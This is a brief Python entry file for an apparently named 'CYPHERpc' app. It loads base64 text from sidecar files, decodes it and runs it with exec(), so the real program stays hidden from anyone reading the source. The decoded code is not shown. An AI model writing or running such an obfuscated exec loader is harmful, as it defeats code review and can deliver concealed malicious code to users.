"""CYPHERpc entry – loads full app."""
from pathlib import Path
import base64
import sys

_ROOT = Path(__file__).resolve().parent
_parts = []
for i in range(3):
    p = _ROOT / f"_main_b64_{i}.txt"
    if p.exists():
        _parts.append(p.read_text(encoding="ascii"))
if _parts:
    code = base64.b64decode("".join(_parts)).decode("utf-8")
    # Execute in this module namespace so python -m src.main works
    exec(compile(code, str(_ROOT / "main_full.py"), "exec"), globals())
else:
    print("Missing main payload. Re-clone repo.")
    sys.exit(1)
